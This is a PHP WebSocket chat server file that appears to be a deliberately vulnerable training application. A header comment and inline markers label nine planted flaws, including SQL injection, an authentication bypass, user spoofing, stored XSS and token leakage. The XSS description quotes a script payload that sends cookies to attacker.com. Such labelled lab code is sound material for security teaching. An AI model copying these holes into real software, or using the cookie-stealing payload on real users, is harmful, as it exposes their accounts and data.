<?php
/**
 * FILE: websocket/Chat.php
 * =============================================================================
 * VULNERABILITY SUMMARY
 * =============================================================================
 *
 * [1] NO ORIGIN VALIDATION (CROSS-SITE WEBSOCKET HIJACKING)
 *     Type    : Broken Access Control (OWASP A01)
 *     CWE     : CWE-346 – Origin Validation Error
 *     Detail  : onOpen() does not inspect the HTTP Origin header.  Any web page
 *               on any domain can open a WebSocket connection to this server
 *               and use the victim's credentials (cookies/tokens), a condition
 *               known as Cross-Site WebSocket Hijacking (CSWSH).
 *
 * [2] AUTH TOKEN IN WEBSOCKET URL
 *     Type    : Information Disclosure (OWASP A02)
 *     CWE     : CWE-598 – Information Exposure Through Query Strings in GET Request
 *     Detail  : The auth token is passed as a GET parameter in the WebSocket
 *               URL (ws://host:8080?token=XXX).  WebSocket connection URLs are
 *               recorded by web-server access logs, browser history, and the
 *               HTTP Referer header, permanently exposing the session token.
 *
 * [3] SQL INJECTION IN onOpen() TOKEN LOOKUP
 *     Type    : Injection (OWASP A03)
 *     CWE     : CWE-89
 *     Detail  : The $token value from the query string is interpolated directly
 *               into a raw SQL query.  A crafted token value can modify the
 *               query logic to authenticate as any user without a valid token.
 *
 * [4] AUTHENTICATION BYPASS (UNAUTHENTICATED MESSAGES PROCESSED)
 *     Type    : Authentication Failure (OWASP A07)
 *     CWE     : CWE-306 – Missing Authentication for Critical Function
 *     Detail  : onMessage() sends an error JSON to unauthenticated connections
 *               but does NOT return.  Execution continues and the full message
 *               routing logic is processed for unauthenticated clients, allowing
 *               them to join channels and send broadcast messages without ever
 *               providing a valid token.
 *
 * [5] IDOR – USER_ID / USERNAME SPOOFING VIA PAYLOAD
 *     Type    : Broken Access Control (OWASP A01)
 *     CWE     : CWE-639 – Authorization Bypass Through User-Controlled Key
 *     Detail  : In the 'send' action, user_id and username are taken from the
 *               client-supplied JSON payload ($data['user_id'], $data['username'])
 *               rather than from the server-side $userConnections mapping.  Any
 *               connected client can impersonate any other user by forging these
 *               fields, causing every other participant to receive messages
 *               attributed to the spoofed user.
 *
 * [6] STORED XSS VIA UNSANITIZED MESSAGE CONTENT
 *     Type    : Injection – Stored XSS (OWASP A03)
 *     CWE     : CWE-79
 *     Detail  : $data['content'] is broadcast to all channel members without
 *               any HTML-encoding or sanitization.  A payload such as
 *               <script>document.location='https://attacker.com/?c='+document.cookie</script>
 *               is stored and executed in every recipient's browser.
 *
 * [7] NO CHANNEL MEMBERSHIP AUTHORIZATION
 *     Type    : Broken Access Control (OWASP A01)
 *     CWE     : CWE-284 – Improper Access Control
 *     Detail  : The 'join' action adds the connection to any channelClients
 *               group without checking whether the user is a member of that
 *               channel in the database.  Any user can listen to private-channel
 *               messages by sending {"action":"join","channel_id":"X"}.
 *
 * [8] SENSITIVE ERROR INFORMATION SENT TO CLIENT
 *     Type    : Security Misconfiguration (OWASP A05)
 *     CWE     : CWE-209 – Generation of Error Message Containing Sensitive Information
 *     Detail  : onError() serializes the full exception message, file path, line
 *               number, and stack trace into a JSON message sent to the
 *               WebSocket client, leaking internal server paths and logic to
 *               attackers.
 *
 * [9] AUTH TOKEN WRITTEN TO LOG FILE
 *     Type    : Information Disclosure (OWASP A09)
 *     CWE     : CWE-532 – Insertion of Sensitive Information into Log File
 *     Detail  : onOpen() logs the raw token value alongside the connection ID.
 *               The WebSocket log is accessible unauthenticated via
 *               api/internal/logs.php?type=websocket, allowing token theft from
 *               the log file.
 * =============================================================================
 */
require_once __DIR__ . '/../vendor/autoload.php';
require_once __DIR__ . '/../config/database.php';
require_once __DIR__ . '/../config/config.php';
require_once __DIR__ . '/../includes/logger.php';

use Ratchet\MessageComponentInterface;
use Ratchet\ConnectionInterface;

class Chat implements MessageComponentInterface {

    protected $clients;
    // VULN: Maps stored in memory - no limits, memory leak possible
    protected $userConnections = [];
    protected $channelClients  = [];

    public function __construct() {
        $this->clients = new \SplObjectStorage();
    }

    // VULN: No origin check during WebSocket handshake
    public function onOpen(ConnectionInterface $conn) {
        $this->clients->attach($conn);
        // VULN: Token passed as GET parameter in WS URL - logged by web servers
        $queryString = $conn->httpRequest->getUri()->getQuery();
        parse_str($queryString, $params);

        $token = $params['token'] ?? null;
        // VULN: Logs the auth token
        logWebSocket("Connection opened: {$conn->resourceId} token={$token}");

        if ($token) {
            // VULN: Token validated against DB but stored insecurely
            $db   = getDbConnection();
            // VULN: String interpolation in query
            $user = $db->query("SELECT * FROM users WHERE session_token = '$token'")->fetch();
            if ($user) {
                $this->userConnections[$conn->resourceId] = $user;
            }
        }
    }

    // VULN: Trusts client-supplied channel_id and user_id in payload
    public function onMessage(ConnectionInterface $from, $msg) {
        $data = json_decode($msg, true);

        logWebSocket("MSG [{$from->resourceId}]: $msg"); // VULN: Full message logged

        if (!isset($this->userConnections[$from->resourceId])) {
            // VULN: Weak auth check - just sends error, doesn't close connection
            $from->send(json_encode(['error' => 'Not authenticated']));
            // VULN: Does not return - continues processing unauthenticated messages
        }

        $action    = $data['action']     ?? '';
        $channelId = $data['channel_id'] ?? '';

        if ($action === 'join') {
            // VULN: No membership validation
            if (!isset($this->channelClients[$channelId])) {
                $this->channelClients[$channelId] = new \SplObjectStorage();
            }
            $this->channelClients[$channelId]->attach($from);

        } elseif ($action === 'send') {
            $payload = json_encode([
                'type'       => 'message',
                // VULN: IDOR - trusts user_id from payload
                'user_id'    => $data['user_id'] ?? ($this->userConnections[$from->resourceId]['user_id'] ?? 'anonymous'),
                'username'   => $data['username'] ?? 'anonymous', // VULN: Spoofable
                'channel_id' => $channelId,
                // VULN: content not sanitized - stored XSS
                'content'    => $data['content'] ?? '',
                'timestamp'  => time(),
            ]);

            // VULN: No channel membership check before broadcasting
            if (isset($this->channelClients[$channelId])) {
                foreach ($this->channelClients[$channelId] as $client) {
                    $client->send($payload);
                }
            }
        }
    }

    public function onClose(ConnectionInterface $conn) {
        $this->clients->detach($conn);
        unset($this->userConnections[$conn->resourceId]);
        // VULN: Not cleaning up channelClients - memory leak
    }

    public function onError(ConnectionInterface $conn, \Exception $e) {
        // VULN: Full exception details (stack trace) sent to client
        logWebSocket("Error: " . $e->getMessage());
        $conn->send(json_encode([
            'error' => $e->getMessage(),
            'file'  => $e->getFile(),
            'line'  => $e->getLine(),
            'trace' => $e->getTraceAsString(),
        ]));
        $conn->close();
    }
}
